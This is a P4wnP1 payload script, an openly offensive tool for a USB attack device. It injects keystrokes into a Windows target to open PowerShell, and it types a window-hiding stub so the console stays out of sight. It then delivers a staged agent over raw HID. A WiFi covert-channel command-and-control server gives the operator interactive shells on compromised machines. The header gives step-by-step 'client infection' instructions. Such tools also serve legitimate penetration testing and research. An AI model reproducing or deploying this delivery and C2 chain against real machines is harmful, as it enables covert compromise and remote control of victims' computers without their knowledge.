#    This file is part of P4wnP1.
#
#    Copyright (c) 2018, Marcus Mengs. 
#
#    P4wnP1 is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    P4wnP1 is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with P4wnP1.  If not, see <http://www.gnu.org/licenses/>.



# P4wnP1 WiFi covert channel !! EXPERIMENTAL !!
# =============================================
#
# For additional notes see comments in code ... no time to document, right now ... sorry!!
# 
#
# Usage:
#
# 1) Client infection
# - be sure to have the `lang` option in this payload set according to the clients keyboard layout (default us)
# - attach P4wnP1 to clients, wait till LED blinks twice (target is ready to receive keyboard input)
# - press NUMLOCK on target about 5-times (fast)
# - P4wnP1 starts typing out the payload, if `HIDE_AGENT_WINDOW` is enabled, the console window gets hidden
# - During typing the LED stops blinking, wait till the LED blinks again (P4wnP1 is still typing out the payload
#   even if the window is hidden)
# - When the LED blinks again, the client payload should be running and P4wnP1 could be removed
# - THE CLIENT NEEDS A WIFI ENABLED INTERFACE FOR THE CHANNEL TO WORK. BUT, THERE'S NO NEED TO HAVE THE CLIENT CONNECTED
#   TO ANY WIFI (that's what this is all about)
#
# 2) Bring up C2 Server
# - Attach P4wnP1 to another host OR POWER SOURCE (there's no host needed, as C2 server is accessed via WiFi)
# - P4wnP1 spawns a WiFi hotspot with name and password set according to the options in this payload
# - connect to the network and login to P4wnP1 with user `pi` and your password
# - on login the C2 serve is attached to the SSH session
# 		- issue `sessions` to list currently connected clients
#		- use `interact <SESSION NUMBER>` to spawn a shell (comms are slow on this channel, so be patient)
#		- press [CTRL + C] during interaction to bring up a menu for the session
#
# Additional notes:

# - the target is still able to connect to WiFi networks and use them, but the payload impacts throughput of valid
# communications as scans are issued rapidly
# - the cleint agent is tested against Win 7 64 / Win 10 64 with Intel WiFi adapters, but still considered 
# experimental (no support)
# - If HIDE_AGENT_WINDOW=false is set, the client agent console is kept visible and displays debug output (the curently
# shipped payload is a DEBUG build)
# - the payload requires latest P4wnP1 installation (modifications to WiFi kernel modules and driver stack) to
# work and should run on kernel 4.9.78+
#
# Client agent code:
#	https://github.com/mame82/P4wnP1_WiFi_covert_channel_client/blob/master/NWiFi/Agent.cs
# C2 server code:
#	https://github.com/mame82/P4wnP1_nexmon_additions/blob/master/wifi_server.py
# WiFi driver + firmware mod:
#	not yet published, compiled version in latest P4wnP1_nexmon_additions
# Firmware interaction layer:
#	https://github.com/mame82/P4wnP1_nexmon_additions/blob/master/mame82_util.py
# More detailed descrition:
#	https://github.com/mame82/P4wnP1_WiFi_covert_channel_client/blob/master/README.md
# Video demo:
#   https://www.youtube.com/watch?v=fbUBQeD0JtA

HIDE_AGENT_WINDOW=true # if true, a powershell stub gets added, which hides the target window during keystroke injection


# overwrite keyboard language from setup.cfg
lang="us" 



# =============================
# USB setup
# =============================
# Make sure to change USB_PID if you enable different USB functionality in order
# to force Windows to enumerate the device again
USB_VID="0x1d6b"        # Vendor ID
USB_PID="0x4137"        # Product ID

USE_ECM=false            # if true CDC ECM will be enabled
USE_RNDIS=false          # if true RNDIS will be enabled
USE_HID=true            # if true HID (keyboard) will be enabled
USE_RAWHID=true         # if true HID raw device will be enabled
USE_UMS=false           # if true USB Mass Storage will be enabled

# disable setting of static routes for all IPv4 addresses
ROUTE_SPOOF=false

# use LED based HID keyboard test
USE_HID_TEST=true

# WIFI config
WIFI_NEXMON=true # use modified nexmon firmware (patched for covert channel)
WIFI_NEXMON_BRING_UP_MONITOR_FIRST=true	# we force monitor interface creation before starting hostapd

WIFI_REG=US
WIFI_ACCESSPOINT=true
WIFI_ACCESSPOINT_CHANNEL=6
WIFI_ACCESSPOINT_NAME="P4wnP1"
WIFI_ACCESSPOINT_PSK="MaMe82-P4wnP1"
WIFI_ACCESSPOINT_IP="172.24.0.1" # IP used by P4wnP1
WIFI_ACCESSPOINT_NETMASK="255.255.255.0"
WIFI_ACCESSPOINT_DHCP_RANGE="172.24.0.2,172.24.0.100" # DHCP Server IP Range
WIFI_ACCESSPOINT_HIDE_SSID=false # don't hide ESSID 

BLUETOOTH_NAP=true # enable bluetooth NAP, P4wnP1 will be rechable via IP configured in setup.cfg (BLUETOOTH_NAP_IP)


# blink one time when payload script get's initiated
led_blink 1 # usage at thi point is invalid, as the script gets called again on SSH login

function onKeyboardUp()
{

	# start HID payload delivery server
	screen -dmS hidsrv bash -c "cd $wdir/hidtools/payload_delivery; python hidserver.py"

	# blink two times when hid keyboard is usable and HID server is started
	led_blink 2

	# as soon as NUMLOCK is pressed rapidly we start the 32 bit PowerShell (needed for payload)
	while $true; do
		# wait for keyboard LED trigger
		key_trigger
	
		led_blink 0 # turn led of while typing
	
		# run interactive PowerShell console
		cat <<- EOF | duckhid
			GUI r
			DELAY 500
			STRING powershell.exe
			ENTER
			DELAY 1000
EOF

		if $HIDE_AGENT_WINDOW; then
			# output window hider stub (taken from P4wnP1 hid cover channel --> fast hiding with a short line, invisible window keeps input fokus)
			# hint: echo instead of printf introduces a new_line_char, which gets interpreted as pressing return by `outhid` 
			echo '$h=(Get-Process -Id $pid).MainWindowHandle;$ios=[Runtime.InteropServices.HandleRef];$hw=New-Object $ios (1,$h);$i=New-Object $ios(2,0);(([reflection.assembly]::LoadWithPartialName("WindowsBase")).GetType("MS.Win32.UnsafeNativeMethods"))::SetWindowPos($hw,$i,0,0,100,100,16512)' | outhid
		fi

		# output stage1 command (loads stage2 via raw HID)
		(printf "\$USB_VID='1D6B';\$USB_PID='4137';"; cat $wdir/hidtools/payload_delivery/stage1_mini.ps1) | outhid

		led_blink 2 # turn led back on, to indicate typing finished
		
	done

}


# commands in this function are ran on user login
# the commans are ran by user "pi"
function onLogin()
{
	# check if server is running (if the server crashed it could be restarted with new ssh login)
	if [ $(ps -aux | grep -v -e grep | grep wifi_server.py | wc -l) -gt 0 ]; then
		echo "Attaching to WiFi covert channel server's screen session ..."
	else
		echo "Starting covert channel server"
		sudo screen -dmS wifi_c2 bash -c "cd $wdir/nexmon; python wifi_server.py"
	fi

	# attach to covert channel control server
	sudo screen -d -r wifi_c2
	return
}
